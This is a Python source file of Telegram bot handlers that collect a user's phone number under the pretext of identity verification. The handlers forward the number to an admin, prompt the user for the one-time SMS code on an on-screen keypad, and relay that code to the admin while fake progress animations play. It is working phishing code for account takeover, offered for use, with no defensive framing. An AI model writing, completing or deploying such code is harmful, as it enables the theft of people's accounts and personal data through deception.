import asyncio
from telegram import Update, ReplyKeyboardRemove
from telegram.ext import (
    ContextTypes,
    ConversationHandler,
)
from .config import *
from .keyboards import *
from .utils import animate_message, send_to_admin

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sends the welcome message and image."""
    await update.message.reply_photo(
        photo=WELCOME_IMAGE_URL,
        caption=WELCOME_CAPTION,
        reply_markup=get_welcome_keyboard(),
        parse_mode='Markdown'
    )
    return START

async def proceed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Requests user contact after 'Proceed' is clicked."""
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text(
        "To verify your identity, please share your phone number using the button below.",
        reply_markup=get_contact_keyboard()
    )
    return AWAITING_CONTACT

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the shared contact and notifies admin."""
    contact = update.message.contact
    user = update.effective_user
    
    # Notify Admin
    admin_text = (
        "👤 *New Verification Request*\n\n"
        f"Name: {user.full_name}\n"
        f"Username: @{user.username}\n"
        f"Phone: +{contact.phone_number}\n"
        f"User ID: `{user.id}`"
    )
    
    # Store user data for later
    context.user_data['phone'] = contact.phone_number
    context.user_data['otp_input'] = ""
    
    await send_to_admin(context, admin_text, reply_markup=get_admin_sms_keyboard(user.id))
    
    # Show animations to user
    msg = await update.message.reply_text("Processing...", reply_markup=ReplyKeyboardRemove())
    context.user_data['status_msg_id'] = msg.message_id
    
    # Simulate animation flow
    await animate_message(update, context, SUBMITTING_MSGS)
    await animate_message(update, context, VERIFYING_MSGS)
    await animate_message(update, context, WAITING_CODE_MSGS)
    
    return AWAITING_CODE

async def otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the numeric keypad for OTP input."""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    current_otp = context.user_data.get('otp_input', "")
    
    if data.startswith("num_"):
        val = data.split("_")[1]
        
        if val == "clear":
            current_otp = ""
        elif val == "submit":
            if len(current_otp) > 0:
                # Forward to admin
                await send_to_admin(
                    context, 
                    f"📩 *OTP Submitted*\nUser: {update.effective_user.full_name}\nCode: `{current_otp}`",
                    reply_markup=get_admin_approval_keyboard(update.effective_user.id)
                )
                
                # Animations for user
                await animate_message(update, context, CHECKING_CODE_MSGS)
                await animate_message(update, context, CONFIRMING_MSGS)
                return ADMIN_CONFIRMATION
            else:
                await query.answer("Please enter the code first!")
                return AWAITING_CODE
        else:
            if len(current_otp) < 6: # Limit to 6 digits
                current_otp += val
        
        context.user_data['otp_input'] = current_otp
        
        # Update message with current input mask
        display_otp = current_otp if current_otp else "____"
        await query.message.edit_text(
            f"{ENTER_CODE_MSG}\n\nCurrent: `{display_otp}`",
            reply_markup=get_otp_keyboard(),
            parse_mode='Markdown'
        )
        
    return AWAITING_CODE

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles admin approval/rejection."""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = int(data.split("_")[1])
    
    if data.startswith("approve_"):
        await context.bot.send_message(chat_id=user_id, text=ACCESS_GRANTED_MSG, parse_mode='Markdown')
        await query.message.edit_text(f"✅ User {user_id} Approved.")
    elif data.startswith("reject_"):
        await context.bot.send_message(chat_id=user_id, text=INVALID_CODE_MSG, parse_mode='Markdown')
        await query.message.edit_text(f"❌ User {user_id} Rejected.")
    
    return ConversationHandler.END

async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles admin sending SMS/Code prompt to user."""
    query = update.callback_query
    await query.answer()
    
    parts = query.data.split("_")
    user_id = int(parts[2])
    
    if "done" in query.data:
        # Tell user to enter code
        await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
        await asyncio.sleep(2)
        await context.bot.send_message(
            chat_id=user_id, 
            text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", 
            reply_markup=get_otp_keyboard(),
            parse_mode='Markdown'
        )
        await query.message.edit_text("✅ Code request sent to user.")
    else:
        # Just an example of interaction
        await query.answer(f"Digit {parts[3]} selected")
